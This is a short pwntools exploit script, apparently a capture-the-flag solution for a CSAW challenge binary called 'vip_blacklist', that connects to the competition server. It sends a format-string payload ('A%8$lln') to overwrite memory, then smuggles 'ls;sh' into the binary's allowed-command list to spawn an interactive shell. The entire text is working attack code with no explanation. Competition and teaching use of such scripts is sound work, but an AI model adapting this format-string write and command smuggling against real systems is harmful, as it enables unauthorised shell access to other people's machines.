from pwn import *

bin = './vip_blacklist'
elf = context.binary = ELF(bin)
#p = process(bin)

context.log_level = 'debug'
p = remote('vip-blacklist.ctf.csaw.io', 9999)
#gdb.attach(p)

payload = b'A%8$lln'
p.sendlineafter(b'Commands: clear exit ls', payload)
p.sendlineafter(b'Commands: clear exit ls', b'\x01')
#24 leaves 8 bytes to write outside of menu?
p.sendafter(b'Commands: clear exit ls', b'queue\x00clear\x00exit\x00\x00ls;sh\x00')
p.interactive()